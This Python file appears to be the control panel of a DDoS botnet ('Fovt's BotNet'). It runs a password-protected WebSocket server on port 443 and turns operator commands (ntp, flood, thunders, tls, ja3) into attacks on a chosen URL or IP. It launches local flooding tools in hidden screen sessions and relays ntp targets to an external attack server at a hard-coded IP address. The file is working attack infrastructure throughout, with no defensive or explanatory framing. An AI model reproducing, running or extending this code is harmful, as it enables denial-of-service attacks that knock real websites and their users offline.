import subprocess
import string
import random
import os
import asyncio
import websockets
import requests


# 清屏 ANSI 转义码
def clear_screen():
    return "\033[H\033[J"

def generate_screen_name(prefix="cc_", length=8):
    """生成一个随机的 screen 名称"""
    chars = string.ascii_letters + string.digits
    return prefix + ''.join(random.choice(chars) for _ in range(length))

# 处理单个 WebSocket 客户端连接
async def handle_client(websocket, path=None):  # 添加默认值 path=None
    try:
        await websocket.send("Welcome to Fovt's BotNet!!!")
        await websocket.send("Please enter the password:")

        # 接收密码
        password = await websocket.recv()
        if password.strip() == "Meatbuns":
            await websocket.send(clear_screen())  # 清屏
            await websocket.send("Welcome to Fovt's BotNet!!!")
            await websocket.send("[Meatbuns@BotNet:~# ] ")

            while True:
                try:
                    # 等待客户端发送指令
                    command = await websocket.recv()
                    command = command.strip()

                    if command == "help":
                        help_message = """
========== HELP ==========
[Fovt's BotNet]
|-- ntp {ip} {port}   -> Perform DDoS attack
|-- flood {url} {time}   -> Perform Flood attack
|-- thunders {url} {time}   -> Perform Thunders attack
|-- tls {url} {time}   -> Perform TLS attack
|-- ja3 {url} {time}   -> Perform Ja3 attack
|-- list            -> Get attack list
|-- exit            -> Exit the session
===========================
"""
                        await websocket.send(help_message)
                        await websocket.send("[Meatbuns@BotNet:~# ] ")
                    elif command.startswith("ntp"):
                        try:
                            _, ip, port = command.split()
                            url = f"http://45.221.97.107:5000/attack?ip={ip}&port={port}"
                            response = requests.get(url)
                            await websocket.send(response.text)
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                        except Exception:
                            await websocket.send("Invalid dd command format. Usage: dd {ip} {port}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                    elif command.startswith("flood"):
                        try:
                            # 解析命令，获取 URL 和时间参数
                            parts = command.split()
                            if len(parts) != 3:
                                await websocket.send("Invalid flood command format. Usage: flood {url} {time}")
                                await websocket.send("[Meatbuns@BotNet:~# ] ")
                                continue

                            _, url, time = parts

                            # 生成一个随机的 screen 名称
                            screen_name = generate_screen_name()

                            # 构造命令
                            command = f"timeout {time}s ./ddos {url}"

                            # 使用 screen 在后台执行命令
                            subprocess.Popen(['screen', '-dmS', screen_name, 'bash', '-c', command])

                            # 返回确认消息
                            await websocket.send(f"Attack started with {time} seconds for {url}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                        except Exception as e:
                            await websocket.send(f"Error starting flood attack: {e}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                    elif command.startswith("thunders"):
                        try:
                            # 解析命令，获取 URL 和时间参数
                            parts = command.split()
                            if len(parts) != 3:
                                await websocket.send("Invalid flood command format. Usage: flood {url} {time}")
                                await websocket.send("[Meatbuns@BotNet:~# ] ")
                                continue

                            _, url, time = parts

                            # 生成一个随机的 screen 名称
                            screen_name = generate_screen_name()

                            # 构造命令
                            command = f"timeout {time}s ./thunders GET {url} {time} 100 100 http.txt 20"

                            # 使用 screen 在后台执行命令
                            subprocess.Popen(['screen', '-dmS', screen_name, 'bash', '-c', command])

                            # 返回确认消息
                            await websocket.send(f"Attack started with {time} seconds for {url}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                        except Exception as e:
                            await websocket.send(f"Error starting flood attack: {e}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                    elif command.startswith("tls"):
                        try:
                            # 解析命令，获取 URL 和时间参数
                            parts = command.split()
                            if len(parts) != 3:
                                await websocket.send("Invalid tls command format. Usage: tls {url} {time}")
                                await websocket.send("[Meatbuns@BotNet:~# ] ")
                                continue

                            _, url, time = parts

                            # 生成一个随机的 screen 名称
                            screen_name = generate_screen_name()

                            # 构造命令
                            command = f"timeout {time}s node tls.js {url} {time} 64 12 http.txt"

                            # 使用 screen 在后台执行命令
                            subprocess.Popen(['screen', '-dmS', screen_name, 'bash', '-c', command])

                            # 返回确认消息
                            await websocket.send(f"TLS attack started with {time} seconds for {url}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                        except Exception as e:
                            await websocket.send(f"Error starting TLS attack: {e}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                    elif command.startswith("ja3"):
                        try:
                            # 解析命令，获取 URL 和时间参数
                            parts = command.split()
                            if len(parts) != 3:
                                await websocket.send("Invalid ja3 command format. Usage: ja3 {url} {time}")
                                await websocket.send("[Meatbuns@BotNet:~# ] ")
                                continue

                            _, url, time = parts

                            # 生成一个随机的 screen 名称
                            screen_name = generate_screen_name()

                            # 构造命令
                            command = f"timeout {time}s node ja3.js {url} {time} 64 12 http.txt --db --qy"

                            # 使用 screen 在后台执行命令
                            subprocess.Popen(['screen', '-dmS', screen_name, 'bash', '-c', command])

                            # 返回确认消息
                            await websocket.send(f"Ja3 attack started with {time} seconds for {url}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                        except Exception as e:
                            await websocket.send(f"Error starting TLS attack: {e}")
                            await websocket.send("[Meatbuns@BotNet:~# ] ")
                    elif command == "list":
                        result = subprocess.run(['screen', '-ls'], capture_output=True, text=True, check=True)
                        await websocket.send(result.stdout)
                    elif command == "exit":
                        await websocket.send("Goodbye!")
                        break
                    else:
                        await websocket.send('Unknown command. Type "help" for assistance.')
                        await websocket.send("[Meatbuns@BotNet:~# ] ")
                except websockets.ConnectionClosed:
                    print("Client disconnected.")
                    break
                except Exception as e:
                    print(f"Error handling command: {e}")
                    await websocket.send("An error occurred. Please try again.")
                    await websocket.send("[Meatbuns@BotNet:~# ] ")
        else:
            await websocket.send("Invalid password. Disconnecting...")
    except websockets.ConnectionClosed:
        print("Client forcibly closed the connection.")
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        print("Connection closed.")


# 启动 WebSocket 服务器
async def start_server():
    server = await websockets.serve(handle_client, "0.0.0.0", 443)  # 修改端口为 443
    print("[*] WebSocket server listening on port 443")
    await server.wait_closed()


if __name__ == "__main__":
    try:
        asyncio.run(start_server())
    except KeyboardInterrupt:
        print("\n[*] Server shutting down...")